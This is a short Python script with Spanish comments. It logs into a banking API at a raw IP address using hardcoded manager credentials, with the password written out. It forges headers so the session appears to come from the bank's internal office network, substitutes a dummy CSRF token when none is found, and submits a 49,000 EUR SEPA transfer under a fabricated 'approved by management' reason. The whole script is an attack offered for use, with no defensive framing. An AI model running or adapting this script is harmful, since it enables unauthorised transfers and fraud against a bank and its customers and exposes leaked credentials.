import requests
import json

# === URLs ===
login_url = "http://80.78.30.242:9181/api/login/"
transfer_url = "http://80.78.30.242:9181/api/send-transfer"

# === Datos del gerente ===
auth_data = {
    "username": "markmur88",
    "password": "Ptf8454Jd55"
}

# === Sesión falsificada como si viniera de red local del banco ===
session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en;q=0.8",
    "Content-Type": "application/json",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
})

# === Paso 1: LOGIN con credenciales y obtener sesión Django + cookies ===
login_response = session.post(login_url, json=auth_data)
print("Token response:", login_response.text)
print("Cookies tras login:", session.cookies.get_dict())

try:
    jwt_token = login_response.json().get("token")
    if jwt_token:
        session.headers.update({
            "Authorization": f"Bearer {jwt_token}",
            "X-Token-ID": jwt_token,
            "X-Session-Type": "BANCO-INTERNAL",
        })
except Exception as e:
    print("[!] No hay token JSON. Reintentando con cookie de sesión y sin bearer.")

# === Paso 2: Cargar csrftoken desde cookie o desde verificación web ===
csrf_response = session.get("http://80.78.30.242:9181/api/transferencia/verify/")
csrf_token = session.cookies.get("csrftoken")
if not csrf_token:
    csrf_token = "dummycsrf"

session.headers.update({
    "X-CSRFToken": csrf_token,
    "Content-Type": "application/json",
})

# === Paso 3: Enviar transferencia SEPA desde sesión de usuario web, no solo JWT ===
transfer_data = {
    "payment_id": "123e4567-e89b-12d3-a456-426614174000",
    "debtor_account_id": 123,
    "creditor_account_id": 456,
    "instructed_amount": "49000.00",
    "currency": "EUR",
    "reason": "Pago proveedor interno, aprobado por gerencia",
    "timestamp": "2025-07-06T14:45:00Z"
}

print("\n[+] Inyectando transferencia desde sesión completa. Incluido cookie, sessionid y jwt firmado.")
transfer_response = session.post(transfer_url, json=transfer_data)
print("Status de transferencia:", transfer_response.status_code)
print("Respuesta:", transfer_response.text)